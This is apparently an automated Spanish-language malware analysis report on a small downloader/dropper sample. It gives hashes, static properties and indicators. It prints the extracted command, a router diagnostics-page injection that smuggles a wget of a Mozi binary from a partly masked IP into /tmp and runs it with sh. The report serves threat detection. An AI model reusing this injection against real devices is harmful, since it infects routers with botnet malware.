# 🧬 Payload Analysis

`d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:25:57+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912`
- **MD5:** `becf47cea7d7f8628ccdb921ba376d08`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.46 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 202.47.56.XXX | static_analysis |
| url | hxxp://202.47.56.XXX:59235/Mozi.m+-O+- | strings |
| hash | d34b018af13acbe85ac47fcd3ae936df60c19563b1698dca3d9c8857567da912 | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.47.56.XXX:59235/Mozi.m+-O+->/tmp/gpon80;sh | strings |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
